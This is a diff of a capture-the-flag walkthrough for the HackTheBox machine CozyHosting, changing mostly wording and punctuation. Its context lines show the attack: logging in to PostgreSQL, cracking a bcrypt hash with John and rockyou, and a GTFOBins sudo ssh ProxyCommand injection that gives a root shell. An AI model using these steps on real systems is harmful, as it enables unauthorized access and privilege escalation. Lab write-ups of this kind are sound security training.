@@ -179,7 +179,7 @@ I output the content of the file on the terminal and I get a username on top of 
 
 ![cozyhosting-full-credentials](/images/HTB-CozyHosting/postgres-credentials.png)
 
-We log in PostgreSQL with  
+We log in PostgreSQL with
 
 ```
 psql -h 127.0.0.1 -U postgres
@@ -192,7 +192,7 @@ Then we connect to the database with
 ```
 ![cozyhosting-db-login](/images/HTB-CozyHosting/postgres-loggedin.png)
 
-I then list the tables of the database with `\d`
+I then list the tables of the database with `\d`.
 
 ![cozyhosting-db-tables](/images/HTB-CozyHosting/db-tables.png)
 
@@ -217,9 +217,7 @@ Let's try to crack the hash. First I get it into a file.
 echo '$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm' > hash.txt
 ```
 
-> If you don't want to use John, use this website [hashes.com](https://hashes.com/en/decrypt/hash)
-
-I use John to crack it.
+> If you don't want to use `John`, use this website [hashes.com](https://hashes.com/en/decrypt/hash)
 
 ```
 john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
@@ -241,7 +239,7 @@ I use `sudo -l` to see what this user can run.
 
 ![cozyhosting-sudo-l](/images/HTB-CozyHosting/sudo-l-josh.png)
 
-I go to [GTFObins](https://gtfobins.github.io/gtfobins/ssh/#sudo) to find some ssh root shells commands and I find
+I go to [GTFObins](https://gtfobins.github.io/gtfobins/ssh/#sudo) to find some ssh root shells commands and I use
 
 ```
 sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
